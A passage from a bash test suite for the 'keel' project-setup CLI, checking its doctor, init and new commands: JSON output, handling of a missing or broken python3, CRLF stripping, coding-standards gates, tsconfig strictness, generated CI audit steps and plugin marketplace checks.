case "$out" in *"internal/RULES.md"*) ok "doctor reads CLAUDE.md links, not only the README" ;;
  *) bad "referenced docs" "missed an unreadable document linked from CLAUDE.md" ;; esac
rm -rf "$d"

# ---- no profile at all ---------------------------------------------------

d="$(fixture bare)"
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then bad "doctor no profile" "passed"
else ok "doctor fails when there is no profile"; fi
rm -rf "$d"

# ---- keel new -------------------------------------------------------------
# The property that matters: a freshly created project's only doctor problem is the one action item
# it was told about (write docs/standards.md, NEXT-STEPS.md step 1), and once that is done, doctor is
# clean. gates.coding_standards defaults to required and `new` cannot write the document itself: that
# needs the coding-standards skill's own judgement about which house references apply, which `new`,
# a plain shell script, does not have.

parent="$(mktemp -d)"
( cd "$parent" && "$KEEL" new svc-node --stack node >/dev/null 2>&1 )
d="$parent/svc-node"

[ -d "$d" ] && ok "new creates the project directory" || bad "new" "no directory"
[ -f "$d/.keel/profile.json" ] && ok "new writes a profile" || bad "new" "no profile"
[ -f "$d/CLAUDE.md" ] && ok "new writes the CLAUDE.md block" || bad "new" "no CLAUDE.md"
[ -d "$d/docs/keel" ] && ok "new scaffolds the docs root" || bad "new" "no docs root"
( cd "$d" && git rev-parse --git-dir >/dev/null 2>&1 ) && ok "new initialises git" || bad "new" "not a repo"
[ -f "$d/.github/workflows/ci.yml" ] && ok "new writes a CI workflow" || bad "new" "no CI"

out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *"gates.coding_standards is required"*"standards.md does not exist"*) ok "a new project names the one thing it still owes doctor" ;;
  *) bad "new" "doctor's only complaint on a fresh project should be the missing standards.md, got: $out" ;;
esac
[ "$(printf '%s\n' "$out" | grep -c '^FAIL')" -eq 1 ] && ok "and that is the only FAIL a fresh project has" \
  || bad "new" "doctor found more than the one named problem: $out"

# The whole point: once the named prerequisite is met, the generated verify commands actually run.
seed_standards "$d"
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "a new project passes keel doctor once standards.md exists"
else bad "new" "doctor still fails on a freshly created project with standards.md in place"; fi

# And the sample test must genuinely pass, not just exist.
tc="$(prof_of "$d" verify.test)"
if ( cd "$d" && eval "$tc" >/dev/null 2>&1 ); then ok "the generated test command passes"
else bad "new" "generated test command '$tc' fails"; fi

# One commit, so the project has a baseline.
n="$( cd "$d" && git rev-list --count HEAD 2>/dev/null || echo 0 )"
[ "$n" = "1" ] && ok "new makes one initial commit" || bad "new" "expected 1 commit, got $n"
rm -rf "$parent"

# --- keel doctor --json ---------------------------------------------------------------------
dj="$(fixture bare)"
( cd "$dj" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$dj" && "$KEEL" doctor --json --fast 2>/dev/null )"
printf '%s' "$out" | python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null \
  && ok "keel doctor --json prints one parseable JSON document" \
  || bad "doctor --json" "output did not parse as JSON: $out"

sv="$(printf '%s' "$out" | python3 -c "import json,sys; print(json.load(sys.stdin).get('schema_version'))")"
[ "$sv" != "None" ] && [ -n "$sv" ] && ok "doctor --json reports schema_version" \
  || bad "doctor --json" "schema_version missing or null"

nfindings="$(printf '%s' "$out" | python3 -c "import json,sys; print(len(json.load(sys.stdin)['findings']))")"
[ "$nfindings" -gt 0 ] && ok "doctor --json reports at least one finding" \
  || bad "doctor --json" "findings array is empty"

# harnesses is the profile's list, verbatim. init on a fixture writes at least one entry.
hs="$(printf '%s' "$out" | python3 -c "import json,sys; d=json.load(sys.stdin); h=d['harnesses']; print(','.join(h) if isinstance(h, list) else 'NOT-A-LIST')")"
[ -n "$hs" ] && [ "$hs" != "NOT-A-LIST" ] && ok "doctor --json reports harnesses as a list ($hs)" \
  || bad "doctor --json" "harnesses missing, empty, or not a list: $hs"
pf="$(python3 -c "import json; print(','.join(json.load(open('$dj/.keel/profile.json')).get('harnesses', [])))")"
[ "$hs" = "$pf" ] && ok "doctor --json harnesses matches the profile verbatim" \
  || bad "doctor --json" "harnesses differs from the profile: json=$hs profile=$pf"

# --fast without --json still behaves exactly as before
( cd "$dj" && "$KEEL" doctor --fast >/dev/null 2>&1 )
rc_text=$?
( cd "$dj" && "$KEEL" doctor --json --fast >/dev/null 2>&1 )
rc_json=$?
[ "$rc_text" -eq "$rc_json" ] && ok "doctor --json exits the same as text mode on the same project" \
  || bad "doctor --json" "exit code differs from text mode: text=$rc_text json=$rc_json"
rm -rf "$dj"

# --- keel doctor --json without python3 -----------------------------------------------------
# Simulates python3 being absent: a PATH built from symlinks to everything the real PATH offers
# except python3 itself, so git, sed, and the rest doctor shells out to still work. Before this
# fix, the python3 call cmd_doctor makes to build the JSON failed silently to stdout (just a
# "command not found" on stderr) while still exiting however cmd_doctor_text exited, leaving a
# fleet script with an empty "JSON" and no explanation.
dnp="$(fixture bare)"
( cd "$dnp" && "$KEEL" init -y >/dev/null 2>&1 )
nopy_dir="$(mktemp -d)"
oldifs="$IFS"; IFS=':'
for pd in $PATH; do
  [ -d "$pd" ] || continue
  for f in "$pd"/*; do
    [ -e "$f" ] || continue
    b="$(basename "$f")"
    case "$b" in python3|python3.*|python) continue ;; esac
    [ -e "$nopy_dir/$b" ] || ln -s "$f" "$nopy_dir/$b" 2>/dev/null
  done
done
IFS="$oldifs"
nopy_stdout="$(mktemp)"
nopy_err="$( cd "$dnp" && PATH="$nopy_dir" "$KEEL" doctor --json --fast 2>&1 1>"$nopy_stdout" )"
nopy_rc=$?
[ "$nopy_rc" -ne 0 ] && ok "doctor --json exits non-zero when python3 is absent" \
  || bad "doctor --json" "exited 0 with python3 hidden from PATH"
case "$nopy_err" in *python3*) ok "doctor --json's error names python3 when it is absent" ;;
  *) bad "doctor --json" "stderr did not mention python3: $nopy_err" ;; esac
[ -s "$nopy_stdout" ] && bad "doctor --json" "stdout was not empty with python3 hidden: $(cat "$nopy_stdout")" \
  || ok "doctor --json prints nothing to stdout when python3 is absent, rather than garbage"
rm -rf "$dnp" "$nopy_dir"; rm -f "$nopy_stdout"

# --- have_python: a Windows Store python3 alias must read as absent, not present ---------------
# Windows' App Execution Alias puts a python3.exe on PATH even when Python is not installed: it
# prints a not-found message and exits 49 without doing anything. `command -v python3` only checks
# that the name resolves on PATH, not that it runs, so it reported this shim as present and every
# check gated on have_python believed python3 worked. Distinct from the doctor --json case above,
# which is a python3 truly absent from PATH; this one is present and broken.
hpd="$(fixture bare)"
( cd "$hpd" && "$KEEL" init -y >/dev/null 2>&1 )
storeshim="$(mktemp -d)"
cat > "$storeshim/python3" <<'SHIM'
#!/bin/sh
printf 'Python was not found; run without arguments to install from the Microsoft Store.\n'
exit 49
SHIM
chmod +x "$storeshim/python3"
hp_out="$( cd "$hpd" && PATH="$storeshim:$PATH" "$KEEL" doctor --fast 2>&1 )"
case "$hp_out" in
  *"profile is not valid JSON"*) bad "have_python" "doctor treated the Store alias as a working python3, reporting 'profile is not valid JSON' instead of 'python3 absent'. Got: $hp_out" ;;
  *"python3 absent"*) ok "have_python reads a Store-alias python3 (runs, prints not-found, exits 49) as absent" ;;
  *) bad "have_python" "doctor reported neither outcome. Got: $hp_out" ;;
esac
rm -rf "$hpd" "$storeshim"

# --- doctor's profile-parse check distinguishes "python3 did not run" from "invalid JSON" ------
# Before this fix, any nonzero exit from the `import json` check was folded into "profile is not
# valid JSON", even when the profile parses fine and python3 failed for an unrelated reason. The
# stub below passes have_python's own probe (`python3 -c pass` exits 0) but fails this specific
# check with a message that names no JSON error, simulating any interpreter failure that is not
# the profile being invalid.
dpd="$(fixture bare)"
( cd "$dpd" && "$KEEL" init -y >/dev/null 2>&1 )
dualshim="$(mktemp -d)"
cat > "$dualshim/python3" <<'SHIM'
#!/bin/sh
if [ "$1" = "-c" ] && [ "$2" = "pass" ]; then
    exit 0
fi
printf 'boom: unrelated interpreter failure\n' >&2
exit 3
SHIM
chmod +x "$dualshim/python3"
dp_out="$( cd "$dpd" && PATH="$dualshim:$PATH" "$KEEL" doctor --fast 2>&1 )"
case "$dp_out" in
  *"profile is not valid JSON"*) bad "doctor profile-parse" "a non-JSON interpreter failure was reported as 'profile is not valid JSON'. Got: $dp_out" ;;
  *"boom: unrelated interpreter failure"*) ok "doctor's profile-parse check surfaces python3's own stderr instead of assuming invalid JSON" ;;
  *) bad "doctor profile-parse" "the failure was silently swallowed instead of naming what python3 said. Got: $dp_out" ;;
esac
rm -rf "$dpd" "$dualshim"

# --- json_load strips a CRLF-emitting python3's trailing \r before caching ---------------------
# Windows' text-mode stdout adds \r before \n on every printed line. `read -r` does not strip it,
# so a cached value carried an invisible trailing CR that broke exact-string comparisons downstream.
crd="$(fixture bare)"
( cd "$crd" && "$KEEL" init -y >/dev/null 2>&1 )
crlfdir="$(mktemp -d)"
real_python="$(command -v python3)"
cat > "$crlfdir/python3" <<CRLF
#!/usr/bin/env bash
"$real_python" "\$@" | awk '{printf "%s\r\n", \$0}'
exit "\${PIPESTATUS[0]}"
CRLF
chmod +x "$crlfdir/python3"
crlf_got="$( cd "$crd" && PATH="$crlfdir:$PATH" "$KEEL" profile get project.kind 2>/dev/null )"
case "$crlf_got" in
  *$'\r') bad "json_load" "profile get returned a trailing CR: [$crlf_got]" ;;
  *) ok "json_load strips a CRLF-emitting python3's trailing CR before caching" ;;
esac
rm -rf "$crd" "$crlfdir"

# --- keel doctor --json when the docs root is gitignored -------------------------------------
# check_docs_ignored's failure branch used to print only to stderr (via err, not fail), so no
# FAIL line reached stdout for the JSON reshaper even though problems was incremented and the
# real exit code was nonzero: a --json consumer could see problems: 0 and an empty findings entry
# for this check while the process exited nonzero. Reuses the "gitignored docs root" setup used
# against `keel init` above, against `keel doctor --json` instead.
ddi="$(fixture bare)"
( cd "$ddi" && "$KEEL" init -y >/dev/null 2>&1 )
printf 'docs/\n' >> "$ddi/.gitignore"
dout="$( cd "$ddi" && "$KEEL" doctor --json --fast 2>/dev/null )"
drc=$?
dproblems="$(printf '%s' "$dout" | python3 -c "import json,sys; print(json.load(sys.stdin)['problems'])" 2>/dev/null)"
[ "$drc" -ne 0 ] && [ "${dproblems:-0}" -ge 1 ] \
  && ok "doctor --json's problems count agrees with a nonzero exit when the docs root is gitignored" \
  || bad "doctor --json" "exit=$drc problems=$dproblems: the docs-root check's outcome must reach both"
case "$dout" in *"is ignored by git"*) ok "doctor --json's findings include the gitignored docs root" ;;
  *) bad "doctor --json" "findings did not mention the gitignored docs root: $dout" ;; esac
rm -rf "$ddi"

# ---- gates.coding_standards: required needs a document to check against ---------------------
# A required gate with no <docs_root>/standards.md enforces nothing and reads as configured, which
# is the one state doctor has to name. FR-10, docs/prd/coding-standards-enforcement.md.
cs="$(fixture node-ts)"
( cd "$cs" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$cs" && "$KEEL" profile set gates.coding_standards required >/dev/null 2>&1 )
out="$( cd "$cs" && "$KEEL" doctor --fast 2>&1 )"
case "$out" in
  *"FAIL"*"standards.md does not exist"*) ok "doctor fails a required gate with no standards document" ;;
  *) bad "coding_standards" "no FAIL naming the missing standards document. Got: $out" ;;
esac
mkdir -p "$cs/docs/keel" && printf '# Standards\n' > "$cs/docs/keel/standards.md"
out="$( cd "$cs" && "$KEEL" doctor --fast 2>&1 )"
case "$out" in
  *"standards.md exists"*) ok "doctor reports ok once the document exists" ;;
  *) bad "coding_standards" "no ok line for the present document. Got: $out" ;;
esac
rm -f "$cs/docs/keel/standards.md"
( cd "$cs" && "$KEEL" profile set gates.coding_standards warn >/dev/null 2>&1 )
out="$( cd "$cs" && "$KEEL" doctor --fast 2>&1 )"
case "$out" in
  *"standards.md does not exist"*) bad "coding_standards" "warn must not fail on a missing document. Got: $out" ;;
  *) ok "a warn gate does not fail on a missing standards document" ;;
esac
( cd "$cs" && "$KEEL" profile set gates.coding_standards off >/dev/null 2>&1 )
out="$( cd "$cs" && "$KEEL" doctor --fast 2>&1 )"
case "$out" in
  *"standards.md does not exist"*) bad "coding_standards" "off must not fail on a missing document. Got: $out" ;;
  *) ok "an off gate does not fail on a missing standards document" ;;
esac
rm -rf "$cs"

# ---- init sets strict type checking where the project has not decided --------------------------
# house-defaults.md, "Types and tooling": strict type checking on. The compiler can hold this one,
# so init sets it where tsconfig.json is silent and leaves any value the project chose, either way.
# FR-05, FR-07, NFR-01, docs/prd/coding-standards-enforcement.md.
ts="$(fixture node-ts)"                      # this fixture's tsconfig.json is `{}`
( cd "$ts" && "$KEEL" init -y >/dev/null 2>&1 )
strict="$(python3 -c "import json;print(json.load(open('$ts/tsconfig.json')).get('compilerOptions',{}).get('strict'))")"
[ "$strict" = "True" ] && ok "init sets compilerOptions.strict on a tsconfig that does not decide it" \
  || bad "tsconfig" "compilerOptions.strict is '$strict' after init, want True"
before="$(cat "$ts/tsconfig.json")"
( cd "$ts" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(cat "$ts/tsconfig.json")" = "$before" ] && ok "re-running init leaves a tsconfig it already set byte identical" \
  || bad "tsconfig" "second init changed tsconfig.json"
rm -rf "$ts"

ts2="$(fixture node-ts)"
printf '{ "compilerOptions": { "strict": false, "target": "es2022" } }\n' > "$ts2/tsconfig.json"
( cd "$ts2" && "$KEEL" init -y >/dev/null 2>&1 )
strict="$(python3 -c "import json;print(json.load(open('$ts2/tsconfig.json'))['compilerOptions']['strict'])")"
[ "$strict" = "False" ] && ok "a strict the project set to false is left alone" \
  || bad "tsconfig" "init overrode a deliberate strict: false"
rm -rf "$ts2"

ts2b="$(fixture node-ts)"
printf '{ "compilerOptions": { "strict": false } }\n' > "$ts2b/tsconfig.base.json"
printf '{ "extends": "./tsconfig.base.json" }\n' > "$ts2b/tsconfig.json"
( cd "$ts2b" && "$KEEL" init -y >/dev/null 2>&1 )
strict="$(python3 -c "import json;print(json.load(open('$ts2b/tsconfig.json')).get('compilerOptions',{}).get('strict'))")"
[ "$strict" = "None" ] && ok "a tsconfig that extends another config is left alone" \
  || bad "tsconfig" "init set compilerOptions.strict on a tsconfig with extends, overriding the base config's own strict: false"
rm -rf "$ts2b"

ts3="$(fixture node-ts)"
printf '{\n  // a comment makes this JSONC, which json.load rejects\n  "compilerOptions": {}\n}\n' > "$ts3/tsconfig.json"
before="$(cat "$ts3/tsconfig.json")"
out="$( cd "$ts3" && "$KEEL" init -y 2>&1 )"
[ "$(cat "$ts3/tsconfig.json")" = "$before" ] && ok "a tsconfig init cannot parse is left byte identical" \
  || bad "tsconfig" "init rewrote a tsconfig it could not parse"
case "$out" in *"could not be parsed"*) ok "init says when it left tsconfig.json alone" ;;
  *) bad "tsconfig" "no message about the unparsed tsconfig. Got: $out" ;; esac
rm -rf "$ts3"

py="$(fixture python)"
( cd "$py" && "$KEEL" init -y >/dev/null 2>&1 )
[ ! -e "$py/tsconfig.json" ] && ok "a non-TypeScript project gets no tsconfig.json" \
  || bad "tsconfig" "init created tsconfig.json in a python project"
rm -rf "$py"

# --- write_ci reaches every verify.* command, and keel init writes it too ------------------------
w="$(fixture node-ts)"
( cd "$w" && "$KEEL" init -y >/dev/null 2>&1 )
[ -f "$w/.github/workflows/ci.yml" ] && ok "init writes a CI workflow when none exists" \
  || bad "write_ci" "keel init did not write .github/workflows/ci.yml"
for step in lint build typecheck; do
    grep -q "name: $step" "$w/.github/workflows/ci.yml" \
      && ok "generated CI has a $step step" \
      || bad "write_ci" "no '$step' step in the generated workflow, though verify.$step is set by the node-ts fixture"
done
grep -q 'name: e2e\|name: security' "$w/.github/workflows/ci.yml" \
  && bad "write_ci" "e2e or security step present though both are null on this fixture" \
  || ok "write_ci adds no step for a null verify command"
rm -rf "$w"

# init never overwrites a hand-authored workflow
w2="$(fixture node-ts)"
mkdir -p "$w2/.github/workflows"
printf 'name: hand-authored\n' > "$w2/.github/workflows/ci.yml"
( cd "$w2" && "$KEEL" init -y >/dev/null 2>&1 )
grep -q 'hand-authored' "$w2/.github/workflows/ci.yml" \
  && ok "init leaves an existing .github/workflows/ci.yml alone" \
  || bad "write_ci" "init overwrote a hand-authored CI file"
rm -rf "$w2"

# and never writes a GitHub workflow into a project that declares another CI platform
w3="$(fixture node-ts)"
: > "$w3/.gitlab-ci.yml"
( cd "$w3" && "$KEEL" init -y >/dev/null 2>&1 )
[ ! -e "$w3/.github/workflows/ci.yml" ] \
  && ok "init writes no GitHub workflow where deploy.ci already names a platform" \
  || bad "write_ci" "init wrote .github/workflows/ci.yml into a project holding .gitlab-ci.yml"
rm -rf "$w3"

# and never writes one where two CI markers make the platform ambiguous, which detect_ci reports
# as null too, the same as no marker at all
w4="$(fixture node-ts)"
: > "$w4/.gitlab-ci.yml"
: > "$w4/Jenkinsfile"
( cd "$w4" && "$KEEL" init -y >/dev/null 2>&1 )
[ ! -e "$w4/.github/workflows/ci.yml" ] \
  && ok "init writes no GitHub workflow where two CI markers make the platform ambiguous" \
  || bad "write_ci" "init wrote .github/workflows/ci.yml into a project holding both .gitlab-ci.yml and Jenkinsfile"
rm -rf "$w4"

# ---- the generated CI audits dependencies, keyed on the package manager ----------------------
# house-defaults.md, "Dependencies": an advisory scan runs in CI and fails the build on a high
# severity finding. Keyed on the manager, because `npm audit` in a pnpm project fails for the
# wrong reason; pip-audit is pointed at requirements.txt where one exists, because a bare runner
# has nothing installed for it to read. FR-06, FR-07, NFR-01, docs/prd/coding-standards-enforcement.md.
a="$(fixture node-ts)"                       # no lockfile: npm by definition
( cd "$a" && "$KEEL" init -y >/dev/null 2>&1 )
grep -q 'run: npm audit --audit-level=high' "$a/.github/workflows/ci.yml" \
  && ok "an npm project's CI audits with npm audit" \
  || bad "write_ci" "no npm audit step: $(grep 'run:' "$a/.github/workflows/ci.yml" | tr '\n' ' ')"
rm -rf "$a"

a2="$(fixture node-ts)"; : > "$a2/pnpm-lock.yaml"
( cd "$a2" && "$KEEL" init -y >/dev/null 2>&1 )
grep -q 'run: pnpm audit --audit-level high' "$a2/.github/workflows/ci.yml" \
  && ok "a pnpm project's CI audits with pnpm audit" || bad "write_ci" "no pnpm audit step"
grep -q 'npm audit --audit-level=high' "$a2/.github/workflows/ci.yml" \
  && bad "write_ci" "npm audit written into a pnpm project" || ok "a pnpm project's CI never runs npm audit"
rm -rf "$a2"

a3="$(fixture node-ts)"; : > "$a3/yarn.lock"
( cd "$a3" && "$KEEL" init -y >/dev/null 2>&1 )
grep -q 'run: yarn npm audit --severity high' "$a3/.github/workflows/ci.yml" \
  && ok "a yarn project's CI audits with yarn npm audit" || bad "write_ci" "no yarn audit step"
rm -rf "$a3"

a4="$(fixture python)"; printf 'requests==2.32.3\n' > "$a4/requirements.txt"
( cd "$a4" && "$KEEL" init -y >/dev/null 2>&1 )
grep -q 'run: pip install pip-audit && pip-audit -r requirements.txt' "$a4/.github/workflows/ci.yml" \
  && ok "a pip project with requirements.txt audits that file" || bad "write_ci" "no pip-audit -r step"
rm -rf "$a4"

a5="$(fixture python)"
( cd "$a5" && "$KEEL" init -y >/dev/null 2>&1 )
grep -q 'run: pip install pip-audit && pip-audit$' "$a5/.github/workflows/ci.yml" \
  && ok "a pip project with no requirements.txt audits the environment" || bad "write_ci" "no plain pip-audit step"
rm -rf "$a5"

a6="$(fixture python)"; : > "$a6/poetry.lock"
out="$( cd "$a6" && "$KEEL" init -y 2>&1 )"
grep -q 'name: Audit dependencies' "$a6/.github/workflows/ci.yml" \
  && bad "write_ci" "an audit step was written for poetry, which has no mapping" \
  || ok "a package manager with no audit mapping gets no step"
case "$out" in *"no dependency audit step"*"poetry"*) ok "init says why no audit step was written" ;;
  *) bad "write_ci" "init did not say the audit step was skipped. Got: $out" ;; esac
rm -rf "$a6"

a8="$(fixture go)"
out="$( cd "$a8" && "$KEEL" init -y 2>&1 )"
case "$out" in *"no dependency audit step"*) bad "write_ci" "a go project was told about an audit mapping that was never for it" ;;
  *) ok "the missing-audit note is silent outside the ecosystems the mapping covers" ;; esac
rm -rf "$a8"

# re-running init does not touch a workflow it already wrote, so the step cannot duplicate
a7="$(fixture node-ts)"
( cd "$a7" && "$KEEL" init -y >/dev/null 2>&1 )
before="$(cat "$a7/.github/workflows/ci.yml")"
( cd "$a7" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(cat "$a7/.github/workflows/ci.yml")" = "$before" ] \
  && ok "a second init leaves the generated workflow, audit step included, byte identical" \
  || bad "write_ci" "second init changed the generated workflow"
rm -rf "$a7"

# Refuses to write into a non-empty directory.
parent="$(mktemp -d)"; mkdir -p "$parent/taken"; echo x > "$parent/taken/file"
if ( cd "$parent" && "$KEEL" new taken --stack node >/dev/null 2>&1 ); then
  bad "new" "overwrote a non-empty directory"
else ok "new refuses a non-empty directory"; fi
rm -rf "$parent"

# Python stack.
parent="$(mktemp -d)"
( cd "$parent" && "$KEEL" new svc-py --stack python >/dev/null 2>&1 )
got="$(prof_of "$parent/svc-py" stack.language)"
[ "$got" = "python" ] && ok "new supports the python stack" || bad "new python" "got '$got'"
seed_standards "$parent/svc-py"
if ( cd "$parent/svc-py" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "a new python project passes doctor once standards.md exists"
else bad "new python" "doctor fails"; fi
rm -rf "$parent"

# ---- pre-code repos, and the artifact map --------------------------------
# Found by running init on a real repo that had 30k words of requirements and no code: doctor
# failed on verify.test_one, which a documents-only project can never satisfy, and the skills would
# have looked for a PRD in docs/keel/prd/ while one already existed under another name.

d="$(fixture bare)"
printf '# Requirements\n' > "$d/requirements.md"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" project.kind)"
[ "$got" = "docs" ] && ok "a repo with no source is detected as kind docs" || bad "pre-code" "kind is '$got', want 'docs'"
seed_standards "$d"
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "doctor passes on a pre-code repo"
else bad "pre-code" "doctor fails on a documents-only repo, which it can never satisfy"; fi
rm -rf "$d"

# A repo with source is still expected to have a test command.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" project.kind)"
[ "$got" = "service" ] && ok "a repo with source is not marked docs" || bad "kind" "got '$got'"
rm -rf "$d"

# The artifact map: init seeds it, and doctor validates any path that is set.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
seed_standards "$d"
if python3 -c "import json,sys;d=json.load(open('$d/.keel/profile.json'));sys.exit(0 if 'artifacts' in d else 1)"; then
  ok "init seeds an artifacts map"; else bad "artifacts" "no artifacts key in the profile"; fi

python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["artifacts"]["prd"]="docs/PROD-042-requirements.md"
p.write_text(json.dumps(d,indent=2)+"\n")
PY
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then
  bad "artifacts" "doctor passed with a mapped path that is missing"
else ok "doctor fails when an artifact path does not exist"; fi

mkdir -p "$d/docs" && printf '# PRD\n' > "$d/docs/PROD-042-requirements.md"
# Neutralise the verify commands, so this case tests the artifact map and nothing else. The fixture's
# `npm test` runs jest, which is not installed, and would fail doctor for an unrelated reason.
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={k:("true" if k in ("test","test_one","lint") else None) for k in d["verify"]}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
if ( cd "$d" && "$KEEL" doctor >/dev/null 2>&1 ); then ok "doctor passes once the mapped path exists"
else bad "artifacts" "doctor still fails with a valid mapped path"; fi
rm -rf "$d"

# --- doctor's artifact-path check strips a CRLF-emitting python3's trailing \r -----------------
# The artifacts loop compares a path read from python3's stdout against the filesystem with
# [ -e ]. A real file's path carries no CR, so a value read verbatim off Windows' CRLF stdout
# compared as absent even though the file is right there.
crfd="$(fixture node-ts)"
( cd "$crfd" && "$KEEL" init -y >/dev/null 2>&1 )
seed_standards "$crfd"
python3 - "$crfd" <<'PY'
import json, sys, pathlib
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text())
d["artifacts"]["prd"] = "docs/PROD-CRLF-requirements.md"
d["verify"] = {k: ("true" if k in ("test", "test_one", "lint") else None) for k in d["verify"]}
p.write_text(json.dumps(d, indent=2) + "\n")
PY
mkdir -p "$crfd/docs" && printf '# PRD\n' > "$crfd/docs/PROD-CRLF-requirements.md"
crlfdir2="$(mktemp -d)"
real_python2="$(command -v python3)"
cat > "$crlfdir2/python3" <<CRLF2
#!/usr/bin/env bash
"$real_python2" "\$@" | awk '{printf "%s\r\n", \$0}'
exit "\${PIPESTATUS[0]}"
CRLF2
chmod +x "$crlfdir2/python3"
crlf2_out="$( cd "$crfd" && PATH="$crlfdir2:$PATH" "$KEEL" doctor 2>&1 )"
case "$crlf2_out" in
  *"artifacts.prd points at"*"does not exist"*) bad "artifacts CRLF" "a real file compared as missing because its path carried a trailing CR. Got: $crlf2_out" ;;
  *) ok "the artifacts path check strips a CRLF-emitting python3's trailing CR before comparing" ;;
esac
rm -rf "$crfd" "$crlfdir2"

# ---- the marketplace check is advisory, and never mentions gh --------------
# This replaced a check on gh. Doctor used to report that gh was needed to install from the
# private marketplace; it is not, as an install on a machine with no gh proved. The old wording
# sent people to install a tool they did not need. The check that matters is whether the
# marketplace is registered at all, since that is what decides whether a session has any skills.
#
# It stays advisory for the reason the gh check was made advisory, found by CI: a GitHub Actions
# runner has no marketplace registered and is a legitimate state, so failing on it makes doctor
# unusable in every pipeline.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]={k:("true" if k in ("test","test_one") else None) for k in d["verify"]}
p.write_text(json.dumps(d,indent=2)+"\n")
PY
seed_standards "$d"

# An absent marketplace warns and must not fail, which is the CI case.
if ( cd "$d" && CLAUDE_CONFIG_DIR="$d/empty-config" HOME="$d/empty-home" "$KEEL" doctor >/dev/null 2>&1 ); then
  ok "an unregistered marketplace does not fail doctor"
else bad "marketplace" "doctor failed because no marketplace was registered"; fi

out="$( cd "$d" && CLAUDE_CONFIG_DIR="$d/empty-config" HOME="$d/empty-home" "$KEEL" doctor 2>&1 )"
case "$out" in *"marketplace is not registered"*) ok "doctor names the install command when the marketplace is absent" ;;
  *) bad "marketplace" "doctor said nothing about the missing marketplace" ;; esac

# Registered in CLAUDE_CONFIG_DIR, which is where a profile-based setup keeps it.
mkdir -p "$d/cfg/plugins"
printf '{"keel":{"source":{"source":"github","repo":"gbi-solutions-ltd/keel"}}}\n' \
  > "$d/cfg/plugins/known_marketplaces.json"
out="$( cd "$d" && CLAUDE_CONFIG_DIR="$d/cfg" HOME="$d/empty-home" "$KEEL" doctor 2>&1 )"
case "$out" in *"marketplace is registered"*) ok "doctor finds the marketplace in CLAUDE_CONFIG_DIR" ;;
  *) bad "marketplace" "doctor missed a marketplace in CLAUDE_CONFIG_DIR" ;; esac

# And in the default directory, which is where it lands when CLAUDE_CONFIG_DIR is unset. Both are
# checked because they can differ, and saying "not registered" while it sits in the other one is
# worse than saying nothing. Found on a machine where exactly that was true.
#
# Neither fixture above carries lastUpdated, so both also exercise the unknown-age branch below for
# free. That is why they still pass unchanged: an absent timestamp adds a warning and warnings do
# not fail doctor.
mkdir -p "$d/home/.claude/plugins"
printf '{"keel":{"source":{"source":"github","repo":"gbi-solutions-ltd/keel"}}}\n' \
  > "$d/home/.claude/plugins/known_marketplaces.json"
out="$( cd "$d" && CLAUDE_CONFIG_DIR="$d/empty-config" HOME="$d/home" "$KEEL" doctor 2>&1 )"
case "$out" in *"marketplace is registered"*) ok "doctor falls back to the default config directory" ;;
  *) bad "marketplace" "doctor missed a marketplace in the default directory" ;; esac

# ---- marketplace clone freshness -------------------------------------------
# Registration is a boolean and freshness is not. The clone only moves on `/plugin marketplace
# update`, so an install can sit a full release behind while the clone, the installed copy and its
# gitCommitSha all agree with each other and all disagree with the marketplace. lastUpdated is the
# only local record of when that was last known current.
#
# Every timestamp here is generated relative to now. A hardcoded date makes the suite start failing
# on a day nobody chose.
# Two argument, and deliberately so. A single argument taking either a day count or a literal JSON
# value cannot tell 12345 the number of days from 12345 the numeric lastUpdated, and the first
# version of this helper silently generated a timestamp 12345 days old for the case that was meant
# to prove a non-string is rejected. The test passed the wrong thing and reported it as a product
# failure. An explicit mode is one word longer and cannot do that.
mp_at() {   # mp_at days <n> | mp_at raw <literal-json-value> | mp_at absent
    local ts
    case "$1" in
        days)
            ts="$(python3 -c "
import datetime, sys
print((datetime.datetime.now(datetime.timezone.utc)
       - datetime.timedelta(days=int(sys.argv[1]), hours=1)).strftime('%Y-%m-%dT%H:%M:%S.000Z'))" "$2")"
            printf '{"gbi":{"source":{"source":"github","repo":"gbi-solutions-ltd/keel"},"lastUpdated":"%s"}}\n' "$ts" ;;
        absent) printf '{"gbi":{"source":{"source":"github","repo":"gbi-solutions-ltd/keel"}}}\n' ;;
        raw)    printf '{"gbi":{"source":{"source":"github","repo":"gbi-solutions-ltd/keel"},"lastUpdated":%s}}\n' "$2" ;;
    esac > "$d/cfg/plugins/known_marketplaces.json"
}
mp_doctor() { ( cd "$d" && CLAUDE_CONFIG_DIR="$d/cfg" HOME="$d/empty-home" "$KEEL" doctor 2>&1 ); }

# Well past the threshold. The number is echoed back so the reader can act on it.
mp_at days 30; out="$(mp_doctor)"
case "$out" in *"was last fetched 30 days ago"*) ok "doctor names the age of a stale marketplace clone" ;;
  *) bad "marketplace" "doctor said nothing about a 30 day old marketplace clone" ;; esac

# A stale clone is advisory, never a failure, for the same reason an absent marketplace is: a CI
